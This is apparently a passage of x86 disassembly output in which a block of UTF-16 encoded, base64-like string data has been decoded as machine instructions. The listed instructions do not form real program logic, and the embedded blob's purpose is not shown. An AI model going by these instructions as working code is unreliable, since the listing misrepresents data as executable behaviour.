  403bcc:	00 52 00             	add    %dl,0x0(%edx)
  403bcf:	30 00                	xor    %al,(%eax)
  403bd1:	6c                   	insb   (%dx),%es:(%edi)
  403bd2:	00 7a 00             	add    %bh,0x0(%edx)
  403bd5:	54                   	push   %esp
  403bd6:	00 4d 00             	add    %cl,0x0(%ebp)
  403bd9:	71 00                	jno    0x403bdb
  403bdb:	6c                   	insb   (%dx),%es:(%edi)
  403bdc:	00 55 00             	add    %dl,0x0(%ebp)
  403bdf:	66 00 38             	data16 add %bh,(%eax)
  403be2:	00 46 00             	add    %al,0x0(%esi)
  403be5:	68 00 6c 00 36       	push   $0x36006c00
  403bea:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  403bee:	00 38                	add    %bh,(%eax)
  403bf0:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  403bf4:	00 30                	add    %dh,(%eax)
  403bf6:	00 30                	add    %dh,(%eax)
  403bf8:	00 5a 00             	add    %bl,0x0(%edx)
  403bfb:	73 00                	jae    0x403bfd
  403bfd:	6d                   	insl   (%dx),%es:(%edi)
  403bfe:	00 4b 00             	add    %cl,0x0(%ebx)
  403c01:	4d                   	dec    %ebp
  403c02:	00 77 00             	add    %dh,0x0(%edi)
  403c05:	4e                   	dec    %esi
  403c06:	00 35 00 42 00 52    	add    %dh,0x52004200
  403c0c:	00 6d 00             	add    %ch,0x0(%ebp)
  403c0f:	4e                   	dec    %esi
  403c10:	00 62 00             	add    %ah,0x0(%edx)
  403c13:	49                   	dec    %ecx
  403c14:	00 58 00             	add    %bl,0x0(%eax)
  403c17:	39 00                	cmp    %eax,(%eax)
  403c19:	46                   	inc    %esi
  403c1a:	00 52 00             	add    %dl,0x0(%edx)
  403c1d:	73 00                	jae    0x403c1f
  403c1f:	2b 00                	sub    (%eax),%eax
  403c21:	51                   	push   %ecx
  403c22:	00 61 00             	add    %ah,0x0(%ecx)
  403c25:	59                   	pop    %ecx
  403c26:	00 4d 00             	add    %cl,0x0(%ebp)
  403c29:	49                   	dec    %ecx
  403c2a:	00 6d 00             	add    %ch,0x0(%ebp)
  403c2d:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  403c30:	00 70 00             	add    %dh,0x0(%eax)
  403c33:	71 00                	jno    0x403c35
  403c35:	30 00                	xor    %al,(%eax)
  403c37:	69 00 70 00 4c 00    	imul   $0x4c0070,(%eax),%eax
  403c3d:	61                   	popa
  403c3e:	00 4f 00             	add    %cl,0x0(%edi)
  403c41:	43                   	inc    %ebx
  403c42:	00 65 00             	add    %ah,0x0(%ebp)
  403c45:	54                   	push   %esp
  403c46:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  403c4a:	00 72 00             	add    %dh,0x0(%edx)
  403c4d:	30 00                	xor    %al,(%eax)
  403c4f:	70 00                	jo     0x403c51
  403c51:	75 00                	jne    0x403c53
  403c53:	55                   	push   %ebp
  403c54:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  403c58:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  403c5c:	00 79 00             	add    %bh,0x0(%ecx)
  403c5f:	4e                   	dec    %esi
  403c60:	00 4f 00             	add    %cl,0x0(%edi)
  403c63:	68 00 51 00 69       	push   $0x69005100
  403c68:	00 35 00 36 00 56    	add    %dh,0x56003600
  403c6e:	00 62 00             	add    %ah,0x0(%edx)
  403c71:	34 00                	xor    $0x0,%al
  403c73:	49                   	dec    %ecx
  403c74:	00 61 00             	add    %ah,0x0(%ecx)
  403c77:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  403c7b:	33 00                	xor    (%eax),%eax
  403c7d:	4b                   	dec    %ebx
  403c7e:	00 54 00 6d          	add    %dl,0x6d(%eax,%eax,1)
  403c82:	00 6f 00             	add    %ch,0x0(%edi)
  403c85:	52                   	push   %edx
  403c86:	00 71 00             	add    %dh,0x0(%ecx)
  403c89:	4e                   	dec    %esi
  403c8a:	00 6e 00             	add    %ch,0x0(%esi)
  403c8d:	2f                   	das
  403c8e:	00 65 00             	add    %ah,0x0(%ebp)
  403c91:	61                   	popa
  403c92:	00 35 00 72 00 46    	add    %dh,0x46007200
  403c98:	00 6a 00             	add    %ch,0x0(%edx)
  403c9b:	79 00                	jns    0x403c9d
  403c9d:	73 00                	jae    0x403c9f
  403c9f:	32 00                	xor    (%eax),%al
  403ca1:	37                   	aaa
  403ca2:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  403ca6:	00 30                	add    %dh,(%eax)
  403ca8:	00 36                	add    %dh,(%esi)
  403caa:	00 31                	add    %dh,(%ecx)
  403cac:	00 76 00             	add    %dh,0x0(%esi)
  403caf:	7a 00                	jp     0x403cb1
  403cb1:	67 00 35             	add    %dh,(%di)
  403cb4:	00 47 00             	add    %al,0x0(%edi)
  403cb7:	37                   	aaa
  403cb8:	00 6d 00             	add    %ch,0x0(%ebp)
  403cbb:	44                   	inc    %esp
  403cbc:	00 7a 00             	add    %bh,0x0(%edx)
  403cbf:	2b 00                	sub    (%eax),%eax
  403cc1:	57                   	push   %edi
  403cc2:	00 52 00             	add    %dl,0x0(%edx)
  403cc5:	4e                   	dec    %esi
  403cc6:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  403cca:	00 52 00             	add    %dl,0x0(%edx)
  403ccd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cce:	00 45 00             	add    %al,0x0(%ebp)
  403cd1:	58                   	pop    %eax
  403cd2:	00 51 00             	add    %dl,0x0(%ecx)
  403cd5:	64 00 54 00 6c       	add    %dl,%fs:0x6c(%eax,%eax,1)
  403cda:	00 38                	add    %bh,(%eax)
  403cdc:	00 72 00             	add    %dh,0x0(%edx)
  403cdf:	52                   	push   %edx
  403ce0:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  403ce4:	00 57 00             	add    %dl,0x0(%edi)
  403ce7:	6b 00 59             	imul   $0x59,(%eax),%eax
  403cea:	00 74 00 56          	add    %dh,0x56(%eax,%eax,1)
  403cee:	00 46 00             	add    %al,0x0(%esi)
  403cf1:	71 00                	jno    0x403cf3
  403cf3:	6f                   	outsl  %ds:(%esi),(%dx)
  403cf4:	00 52 00             	add    %dl,0x0(%edx)
  403cf7:	76 00                	jbe    0x403cf9
  403cf9:	78 00                	js     0x403cfb
  403cfb:	39 00                	cmp    %eax,(%eax)
  403cfd:	47                   	inc    %edi
  403cfe:	00 2b                	add    %ch,(%ebx)
  403d00:	00 2f                	add    %ch,(%edi)
  403d02:	00 59 00             	add    %bl,0x0(%ecx)
  403d05:	45                   	inc    %ebp
  403d06:	00 4b 00             	add    %cl,0x0(%ebx)
  403d09:	4f                   	dec    %edi
  403d0a:	00 79 00             	add    %bh,0x0(%ecx)
  403d0d:	78 00                	js     0x403d0f
  403d0f:	42                   	inc    %edx
  403d10:	00 2b                	add    %ch,(%ebx)
  403d12:	00 45 00             	add    %al,0x0(%ebp)
  403d15:	45                   	inc    %ebp
  403d16:	00 48 00             	add    %cl,0x0(%eax)
  403d19:	4e                   	dec    %esi
  403d1a:	00 6a 00             	add    %ch,0x0(%edx)
  403d1d:	54                   	push   %esp
  403d1e:	00 46 00             	add    %al,0x0(%esi)
  403d21:	32 00                	xor    (%eax),%al
  403d23:	2f                   	das
  403d24:	00 76 00             	add    %dh,0x0(%esi)
  403d27:	62 00                	bound  %eax,(%eax)
  403d29:	7a 00                	jp     0x403d2b
  403d2b:	45                   	inc    %ebp
  403d2c:	00 37                	add    %dh,(%edi)
  403d2e:	00 4e 00             	add    %cl,0x0(%esi)
  403d31:	33 00                	xor    (%eax),%eax
  403d33:	34 00                	xor    $0x0,%al
  403d35:	58                   	pop    %eax
  403d36:	00 65 00             	add    %ah,0x0(%ebp)
  403d39:	32 00                	xor    (%eax),%al
  403d3b:	7a 00                	jp     0x403d3d
  403d3d:	55                   	push   %ebp
  403d3e:	00 45 00             	add    %al,0x0(%ebp)
  403d41:	45                   	inc    %ebp
  403d42:	00 61 00             	add    %ah,0x0(%ecx)
  403d45:	39 00                	cmp    %eax,(%eax)
  403d47:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  403d4b:	41                   	inc    %ecx
  403d4c:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  403d50:	00 5a 00             	add    %bl,0x0(%edx)
  403d53:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  403d57:	6c                   	insb   (%dx),%es:(%edi)
  403d58:	00 36                	add    %dh,(%esi)
  403d5a:	00 34 00             	add    %dh,(%eax,%eax,1)
  403d5d:	49                   	dec    %ecx
  403d5e:	00 53 00             	add    %dl,0x0(%ebx)
  403d61:	70 00                	jo     0x403d63
  403d63:	30 00                	xor    %al,(%eax)
  403d65:	44                   	inc    %esp
  403d66:	00 6d 00             	add    %ch,0x0(%ebp)
  403d69:	54                   	push   %esp
  403d6a:	00 79 00             	add    %bh,0x0(%ecx)
  403d6d:	78 00                	js     0x403d6f
  403d6f:	6e                   	outsb  %ds:(%esi),(%dx)
  403d70:	00 63 00             	add    %ah,0x0(%ebx)
  403d73:	4d                   	dec    %ebp
  403d74:	00 7a 00             	add    %bh,0x0(%edx)
  403d77:	5a                   	pop    %edx
  403d78:	00 4a 00             	add    %cl,0x0(%edx)
  403d7b:	62 00                	bound  %eax,(%eax)
  403d7d:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403d81:	43                   	inc    %ebx
  403d82:	00 67 00             	add    %ah,0x0(%edi)
  403d85:	48                   	dec    %eax
  403d86:	00 30                	add    %dh,(%eax)
  403d88:	00 4f 00             	add    %cl,0x0(%edi)
  403d8b:	72 00                	jb     0x403d8d
  403d8d:	39 00                	cmp    %eax,(%eax)
  403d8f:	68 00 36 00 6d       	push   $0x6d003600
  403d94:	00 45 00             	add    %al,0x0(%ebp)
  403d97:	58                   	pop    %eax
  403d98:	00 36                	add    %dh,(%esi)
  403d9a:	00 75 00             	add    %dh,0x0(%ebp)
  403d9d:	51                   	push   %ecx
  403d9e:	00 78 00             	add    %bh,0x0(%eax)
  403da1:	2b 00                	sub    (%eax),%eax
  403da3:	76 00                	jbe    0x403da5
  403da5:	65 00 36             	add    %dh,%gs:(%esi)
  403da8:	00 4b 00             	add    %cl,0x0(%ebx)
  403dab:	65 00 2b             	add    %ch,%gs:(%ebx)
  403dae:	00 43 00             	add    %al,0x0(%ebx)
  403db1:	54                   	push   %esp
  403db2:	00 42 00             	add    %al,0x0(%edx)
  403db5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403db9:	38 00                	cmp    %al,(%eax)
  403dbb:	69 00 56 00 4c 00    	imul   $0x4c0056,(%eax),%eax
  403dc1:	35 00 77 00 32       	xor    $0x32007700,%eax
  403dc6:	00 5a 00             	add    %bl,0x0(%edx)
  403dc9:	50                   	push   %eax
  403dca:	00 70 00             	add    %dh,0x0(%eax)
  403dcd:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  403dd1:	38 00                	cmp    %al,(%eax)
  403dd3:	38 00                	cmp    %al,(%eax)
  403dd5:	63 00                	arpl   %eax,(%eax)
  403dd7:	33 00                	xor    (%eax),%eax
  403dd9:	6b 00 50             	imul   $0x50,(%eax),%eax
  403ddc:	00 6d 00             	add    %ch,0x0(%ebp)
  403ddf:	2b 00                	sub    (%eax),%eax
  403de1:	52                   	push   %edx
  403de2:	00 77 00             	add    %dh,0x0(%edi)
  403de5:	37                   	aaa
  403de6:	00 41 00             	add    %al,0x0(%ecx)
  403de9:	5a                   	pop    %edx
  403dea:	00 68 00             	add    %ch,0x0(%eax)
  403ded:	2b 00                	sub    (%eax),%eax
  403def:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  403df3:	64 00 2b             	add    %ch,%fs:(%ebx)
  403df6:	00 5a 00             	add    %bl,0x0(%edx)
  403df9:	4e                   	dec    %esi
  403dfa:	00 43 00             	add    %al,0x0(%ebx)
  403dfd:	34 00                	xor    $0x0,%al
  403dff:	34 00                	xor    $0x0,%al
  403e01:	68 00 76 00 4c       	push   $0x4c007600
  403e06:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  403e0a:	00 62 00             	add    %ah,0x0(%edx)
  403e0d:	35 00 6e 00 37       	xor    $0x37006e00,%eax
  403e12:	00 38                	add    %bh,(%eax)
  403e14:	00 61 00             	add    %ah,0x0(%ecx)
  403e17:	50                   	push   %eax
  403e18:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  403e1c:	00 76 00             	add    %dh,0x0(%esi)
  403e1f:	52                   	push   %edx
  403e20:	00 7a 00             	add    %bh,0x0(%edx)
  403e23:	47                   	inc    %edi
  403e24:	00 65 00             	add    %ah,0x0(%ebp)
  403e27:	57                   	push   %edi
  403e28:	00 45 00             	add    %al,0x0(%ebp)
  403e2b:	78 00                	js     0x403e2d
  403e2d:	79 00                	jns    0x403e2f
  403e2f:	5a                   	pop    %edx
  403e30:	00 66 00             	add    %ah,0x0(%esi)
  403e33:	47                   	inc    %edi
  403e34:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  403e38:	00 78 00             	add    %bh,0x0(%eax)
  403e3b:	62 00                	bound  %eax,(%eax)
  403e3d:	4b                   	dec    %ebx
  403e3e:	00 62 00             	add    %ah,0x0(%edx)
  403e41:	33 00                	xor    (%eax),%eax
  403e43:	6e                   	outsb  %ds:(%esi),(%dx)
  403e44:	00 4b 00             	add    %cl,0x0(%ebx)
  403e47:	47                   	inc    %edi
  403e48:	00 38                	add    %bh,(%eax)
  403e4a:	00 4f 00             	add    %cl,0x0(%edi)
  403e4d:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  403e50:	00 45 00             	add    %al,0x0(%ebp)
  403e53:	51                   	push   %ecx
  403e54:	00 73 00             	add    %dh,0x0(%ebx)
  403e57:	43                   	inc    %ebx
  403e58:	00 72 00             	add    %dh,0x0(%edx)
  403e5b:	35 00 63 00 55       	xor    $0x55006300,%eax
  403e60:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  403e64:	00 71 00             	add    %dh,0x0(%ecx)
  403e67:	7a 00                	jp     0x403e69
  403e69:	34 00                	xor    $0x0,%al
  403e6b:	48                   	dec    %eax
  403e6c:	00 53 00             	add    %dl,0x0(%ebx)
  403e6f:	67 00 47 00          	add    %al,0x0(%bx)
  403e73:	32 00                	xor    (%eax),%al
  403e75:	59                   	pop    %ecx
  403e76:	00 73 00             	add    %dh,0x0(%ebx)
  403e79:	6f                   	outsl  %ds:(%esi),(%dx)
  403e7a:	00 70 00             	add    %dh,0x0(%eax)
  403e7d:	2b 00                	sub    (%eax),%eax
  403e7f:	6d                   	insl   (%dx),%es:(%edi)
  403e80:	00 70 00             	add    %dh,0x0(%eax)
  403e83:	54                   	push   %esp
  403e84:	00 53 00             	add    %dl,0x0(%ebx)
  403e87:	34 00                	xor    $0x0,%al
  403e89:	68 00 68 00 56       	push   $0x56006800
  403e8e:	00 5a 00             	add    %bl,0x0(%edx)
  403e91:	37                   	aaa
  403e92:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  403e96:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  403e9a:	00 31                	add    %dh,(%ecx)
  403e9c:	00 39                	add    %bh,(%ecx)
  403e9e:	00 59 00             	add    %bl,0x0(%ecx)
  403ea1:	75 00                	jne    0x403ea3
  403ea3:	75 00                	jne    0x403ea5
  403ea5:	72 00                	jb     0x403ea7
  403ea7:	4d                   	dec    %ebp
  403ea8:	00 62 00             	add    %ah,0x0(%edx)
  403eab:	31 00                	xor    %eax,(%eax)
  403ead:	71 00                	jno    0x403eaf
  403eaf:	53                   	push   %ebx
  403eb0:	00 32                	add    %dh,(%edx)
  403eb2:	00 73 00             	add    %dh,0x0(%ebx)
  403eb5:	75 00                	jne    0x403eb7
  403eb7:	4a                   	dec    %edx
  403eb8:	00 31                	add    %dh,(%ecx)
  403eba:	00 34 00             	add    %dh,(%eax,%eax,1)
  403ebd:	67 00 75 00          	add    %dh,0x0(%di)
  403ec1:	57                   	push   %edi
  403ec2:	00 58 00             	add    %bl,0x0(%eax)
  403ec5:	2f                   	das
  403ec6:	00 4e 00             	add    %cl,0x0(%esi)
  403ec9:	33 00                	xor    (%eax),%eax
  403ecb:	7a 00                	jp     0x403ecd
  403ecd:	67 00 31             	add    %dh,(%bx,%di)
  403ed0:	00 6b 00             	add    %ch,0x0(%ebx)
  403ed3:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  403ed7:	6e                   	outsb  %ds:(%esi),(%dx)
  403ed8:	00 63 00             	add    %ah,0x0(%ebx)
  403edb:	53                   	push   %ebx
  403edc:	00 79 00             	add    %bh,0x0(%ecx)
  403edf:	4e                   	dec    %esi
  403ee0:	00 39                	add    %bh,(%ecx)
  403ee2:	00 32                	add    %dh,(%edx)
  403ee4:	00 2b                	add    %ch,(%ebx)
  403ee6:	00 2b                	add    %ch,(%ebx)
  403ee8:	00 2f                	add    %ch,(%edi)
  403eea:	00 4f 00             	add    %cl,0x0(%edi)
  403eed:	4f                   	dec    %edi
  403eee:	00 41 00             	add    %al,0x0(%ecx)
  403ef1:	4c                   	dec    %esp
  403ef2:	00 35 00 75 00 39    	add    %dh,0x39007500
  403ef8:	00 57 00             	add    %dl,0x0(%edi)
  403efb:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  403efe:	00 39                	add    %bh,(%ecx)
  403f00:	00 49 00             	add    %cl,0x0(%ecx)
  403f03:	6d                   	insl   (%dx),%es:(%edi)
  403f04:	00 67 00             	add    %ah,0x0(%edi)
  403f07:	77 00                	ja     0x403f09
  403f09:	58                   	pop    %eax
  403f0a:	00 32                	add    %dh,(%edx)
  403f0c:	00 4e 00             	add    %cl,0x0(%esi)
  403f0f:	4e                   	dec    %esi
  403f10:	00 4d 00             	add    %cl,0x0(%ebp)
  403f13:	4e                   	dec    %esi
  403f14:	00 76 00             	add    %dh,0x0(%esi)
  403f17:	41                   	inc    %ecx
  403f18:	00 2b                	add    %ch,(%ebx)
  403f1a:	00 6b 00             	add    %ch,0x0(%ebx)
  403f1d:	4d                   	dec    %ebp
  403f1e:	00 36                	add    %dh,(%esi)
  403f20:	00 51 00             	add    %dl,0x0(%ecx)
  403f23:	6f                   	outsl  %ds:(%esi),(%dx)
  403f24:	00 46 00             	add    %al,0x0(%esi)
  403f27:	70 00                	jo     0x403f29
  403f29:	50                   	push   %eax
  403f2a:	00 69 00             	add    %ch,0x0(%ecx)
  403f2d:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  403f31:	50                   	push   %eax
  403f32:	00 56 00             	add    %dl,0x0(%esi)
  403f35:	4b                   	dec    %ebx
  403f36:	00 33                	add    %dh,(%ebx)
  403f38:	00 73 00             	add    %dh,0x0(%ebx)
  403f3b:	4c                   	dec    %esp
  403f3c:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  403f40:	00 57 00             	add    %dl,0x0(%edi)
  403f43:	44                   	inc    %esp
  403f44:	00 79 00             	add    %bh,0x0(%ecx)
  403f47:	79 00                	jns    0x403f49
  403f49:	2f                   	das
  403f4a:	00 6e 00             	add    %ch,0x0(%esi)
  403f4d:	73 00                	jae    0x403f4f
  403f4f:	56                   	push   %esi
  403f50:	00 48 00             	add    %cl,0x0(%eax)
  403f53:	59                   	pop    %ecx
  403f54:	00 50 00             	add    %dl,0x0(%eax)
  403f57:	63 00                	arpl   %eax,(%eax)
  403f59:	30 00                	xor    %al,(%eax)
  403f5b:	54                   	push   %esp
  403f5c:	00 37                	add    %dh,(%edi)
  403f5e:	00 41 00             	add    %al,0x0(%ecx)
  403f61:	38 00                	cmp    %al,(%eax)
  403f63:	42                   	inc    %edx
  403f64:	00 4e 00             	add    %cl,0x0(%esi)
  403f67:	6e                   	outsb  %ds:(%esi),(%dx)
  403f68:	00 50 00             	add    %dl,0x0(%eax)
  403f6b:	72 00                	jb     0x403f6d
  403f6d:	33 00                	xor    (%eax),%eax
  403f6f:	50                   	push   %eax
  403f70:	00 4d 00             	add    %cl,0x0(%ebp)
  403f73:	6b 00 35             	imul   $0x35,(%eax),%eax
  403f76:	00 6d 00             	add    %ch,0x0(%ebp)
  403f79:	66 00 33             	data16 add %dh,(%ebx)
  403f7c:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  403f80:	00 49 00             	add    %cl,0x0(%ecx)
  403f83:	45                   	inc    %ebp
  403f84:	00 5a 00             	add    %bl,0x0(%edx)
  403f87:	74 00                	je     0x403f89
  403f89:	54                   	push   %esp
  403f8a:	00 58 00             	add    %bl,0x0(%eax)
  403f8d:	4d                   	dec    %ebp
  403f8e:	00 41 00             	add    %al,0x0(%ecx)
  403f91:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  403f95:	54                   	push   %esp
  403f96:	00 6b 00             	add    %ch,0x0(%ebx)
  403f99:	55                   	push   %ebp
  403f9a:	00 58 00             	add    %bl,0x0(%eax)
  403f9d:	6d                   	insl   (%dx),%es:(%edi)
  403f9e:	00 36                	add    %dh,(%esi)
  403fa0:	00 77 00             	add    %dh,0x0(%edi)
  403fa3:	38 00                	cmp    %al,(%eax)
  403fa5:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  403fa9:	4b                   	dec    %ebx
  403faa:	00 6d 00             	add    %ch,0x0(%ebp)
  403fad:	31 00                	xor    %eax,(%eax)
  403faf:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  403fb3:	41                   	inc    %ecx
  403fb4:	00 6b 00             	add    %ch,0x0(%ebx)
  403fb7:	75 00                	jne    0x403fb9
  403fb9:	6f                   	outsl  %ds:(%esi),(%dx)
  403fba:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  403fbe:	00 33                	add    %dh,(%ebx)
  403fc0:	00 2f                	add    %ch,(%edi)
  403fc2:	00 4b 00             	add    %cl,0x0(%ebx)
  403fc5:	47                   	inc    %edi
  403fc6:	00 45 00             	add    %al,0x0(%ebp)
  403fc9:	71 00                	jno    0x403fcb
  403fcb:	63 00                	arpl   %eax,(%eax)
  403fcd:	55                   	push   %ebp
  403fce:	00 39                	add    %bh,(%ecx)
  403fd0:	00 30                	add    %dh,(%eax)
  403fd2:	00 4c 00 56          	add    %cl,0x56(%eax,%eax,1)
  403fd6:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  403fda:	00 76 00             	add    %dh,0x0(%esi)
  403fdd:	74 00                	je     0x403fdf
  403fdf:	43                   	inc    %ebx
  403fe0:	00 45 00             	add    %al,0x0(%ebp)
  403fe3:	6c                   	insb   (%dx),%es:(%edi)
  403fe4:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  403fe8:	00 4b 00             	add    %cl,0x0(%ebx)
  403feb:	4b                   	dec    %ebx
  403fec:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  403ff0:	00 6d 00             	add    %ch,0x0(%ebp)
  403ff3:	52                   	push   %edx
  403ff4:	00 78 00             	add    %bh,0x0(%eax)
  403ff7:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff8:	00 49 00             	add    %cl,0x0(%ecx)
  403ffb:	48                   	dec    %eax
  403ffc:	00 7a 00             	add    %bh,0x0(%edx)
  403fff:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  404003:	46                   	inc    %esi
  404004:	00 76 00             	add    %dh,0x0(%esi)
  404007:	63 00                	arpl   %eax,(%eax)
  404009:	7a 00                	jp     0x40400b
  40400b:	68 00 6f 00 44       	push   $0x44006f00
  404010:	00 6a 00             	add    %ch,0x0(%edx)
  404013:	4c                   	dec    %esp
  404014:	00 75 00             	add    %dh,0x0(%ebp)
  404017:	55                   	push   %ebp
  404018:	00 39                	add    %bh,(%ecx)
  40401a:	00 6e 00             	add    %ch,0x0(%esi)
  40401d:	4f                   	dec    %edi
  40401e:	00 2b                	add    %ch,(%ebx)
  404020:	00 4f 00             	add    %cl,0x0(%edi)
  404023:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  404027:	64 00 32             	add    %dh,%fs:(%edx)
  40402a:	00 39                	add    %bh,(%ecx)
  40402c:	00 6d 00             	add    %ch,0x0(%ebp)
  40402f:	51                   	push   %ecx
  404030:	00 65 00             	add    %ah,0x0(%ebp)
  404033:	41                   	inc    %ecx
  404034:	00 61 00             	add    %ah,0x0(%ecx)
  404037:	69 00 38 00 32 00    	imul   $0x320038,(%eax),%eax
  40403d:	66 00 30             	data16 add %dh,(%eax)
  404040:	00 46 00             	add    %al,0x0(%esi)
  404043:	6a 00                	push   $0x0
  404045:	76 00                	jbe    0x404047
  404047:	6c                   	insb   (%dx),%es:(%edi)
  404048:	00 76 00             	add    %dh,0x0(%esi)
  40404b:	47                   	inc    %edi
  40404c:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  404050:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  404054:	00 61 00             	add    %ah,0x0(%ecx)
  404057:	50                   	push   %eax
  404058:	00 45 00             	add    %al,0x0(%ebp)
  40405b:	61                   	popa
  40405c:	00 4e 00             	add    %cl,0x0(%esi)
  40405f:	6f                   	outsl  %ds:(%esi),(%dx)
  404060:	00 56 00             	add    %dl,0x0(%esi)
  404063:	76 00                	jbe    0x404065
  404065:	68 00 37 00 41       	push   $0x41003700
  40406a:	00 33                	add    %dh,(%ebx)
  40406c:	00 36                	add    %dh,(%esi)
  40406e:	00 48 00             	add    %cl,0x0(%eax)
  404071:	4f                   	dec    %edi
  404072:	00 55 00             	add    %dl,0x0(%ebp)
  404075:	61                   	popa
  404076:	00 43 00             	add    %al,0x0(%ebx)
  404079:	50                   	push   %eax
  40407a:	00 71 00             	add    %dh,0x0(%ecx)
  40407d:	6c                   	insb   (%dx),%es:(%edi)
  40407e:	00 57 00             	add    %dl,0x0(%edi)
  404081:	68 00 78 00 30       	push   $0x30007800
  404086:	00 63 00             	add    %ah,0x0(%ebx)
  404089:	5a                   	pop    %edx
  40408a:	00 77 00             	add    %dh,0x0(%edi)
  40408d:	5a                   	pop    %edx
  40408e:	00 7a 00             	add    %bh,0x0(%edx)
  404091:	57                   	push   %edi
  404092:	00 30                	add    %dh,(%eax)
  404094:	00 37                	add    %dh,(%edi)
  404096:	00 4a 00             	add    %cl,0x0(%edx)
  404099:	4f                   	dec    %edi
  40409a:	00 46 00             	add    %al,0x0(%esi)
  40409d:	76 00                	jbe    0x40409f
  40409f:	35 00 34 00 7a       	xor    $0x7a003400,%eax
  4040a4:	00 79 00             	add    %bh,0x0(%ecx)
  4040a7:	55                   	push   %ebp
  4040a8:	00 33                	add    %dh,(%ebx)
  4040aa:	00 35 00 66 00 76    	add    %dh,0x76006600
  4040b0:	00 36                	add    %dh,(%esi)
  4040b2:	00 55 00             	add    %dl,0x0(%ebp)
  4040b5:	53                   	push   %ebx
  4040b6:	00 62 00             	add    %ah,0x0(%edx)
  4040b9:	2f                   	das
  4040ba:	00 37                	add    %dh,(%edi)
  4040bc:	00 75 00             	add    %dh,0x0(%ebp)
  4040bf:	54                   	push   %esp
  4040c0:	00 34 00             	add    %dh,(%eax,%eax,1)
  4040c3:	38 00                	cmp    %al,(%eax)
  4040c5:	4b                   	dec    %ebx
  4040c6:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  4040ca:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  4040ce:	00 42 00             	add    %al,0x0(%edx)
  4040d1:	47                   	inc    %edi
  4040d2:	00 78 00             	add    %bh,0x0(%eax)
  4040d5:	32 00                	xor    (%eax),%al
  4040d7:	68 00 77 00 72       	push   $0x72007700
  4040dc:	00 63 00             	add    %ah,0x0(%ebx)
  4040df:	39 00                	cmp    %eax,(%eax)
  4040e1:	70 00                	jo     0x4040e3
  4040e3:	49                   	dec    %ecx
  4040e4:	00 31                	add    %dh,(%ecx)
  4040e6:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  4040ea:	00 69 00             	add    %ch,0x0(%ecx)
  4040ed:	58                   	pop    %eax
  4040ee:	00 7a 00             	add    %bh,0x0(%edx)
  4040f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4040f2:	00 4a 00             	add    %cl,0x0(%edx)
  4040f5:	50                   	push   %eax
  4040f6:	00 7a 00             	add    %bh,0x0(%edx)
  4040f9:	35 00 6c 00 67       	xor    $0x67006c00,%eax
  4040fe:	00 63 00             	add    %ah,0x0(%ebx)
  404101:	66 00 77 00          	data16 add %dh,0x0(%edi)
  404105:	2b 00                	sub    (%eax),%eax
  404107:	6a 00                	push   $0x0
  404109:	51                   	push   %ecx
  40410a:	00 33                	add    %dh,(%ebx)
  40410c:	00 39                	add    %bh,(%ecx)
  40410e:	00 79 00             	add    %bh,0x0(%ecx)
  404111:	64 00 44 00 33       	add    %al,%fs:0x33(%eax,%eax,1)
  404116:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40411a:	00 41 00             	add    %al,0x0(%ecx)
  40411d:	4f                   	dec    %edi
  40411e:	00 56 00             	add    %dl,0x0(%esi)
  404121:	57                   	push   %edi
  404122:	00 7a 00             	add    %bh,0x0(%edx)
  404125:	31 00                	xor    %eax,(%eax)
  404127:	46                   	inc    %esi
  404128:	00 32                	add    %dh,(%edx)
  40412a:	00 68 00             	add    %ch,0x0(%eax)
  40412d:	43                   	inc    %ebx
  40412e:	00 67 00             	add    %ah,0x0(%edi)
  404131:	49                   	dec    %ecx
  404132:	00 4a 00             	add    %cl,0x0(%edx)
  404135:	6a 00                	push   $0x0
  404137:	59                   	pop    %ecx
  404138:	00 77 00             	add    %dh,0x0(%edi)
  40413b:	53                   	push   %ebx
  40413c:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  404140:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
